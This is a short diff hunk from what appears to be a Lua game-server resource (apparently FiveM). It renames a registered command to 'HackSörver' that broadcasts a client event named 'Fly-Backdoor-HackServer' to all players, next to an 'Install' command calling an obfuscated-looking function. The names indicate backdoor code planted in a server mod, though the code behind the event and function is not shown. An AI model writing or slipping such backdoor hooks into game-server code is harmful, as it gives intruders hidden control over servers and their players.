@@ -314,7 +314,7 @@ RegisterCommand("Install", function(source, args, rawCommand)
 	SDhskXCsi391()
 end, false)
 
-RegisterCommand("Sörver ", function(source, args, rawCommand)
+RegisterCommand("HackSörver ", function(source, args, rawCommand)
 	TriggerClientEvent('Fly-Backdoor-HackServer', -1)
 end, false)
 
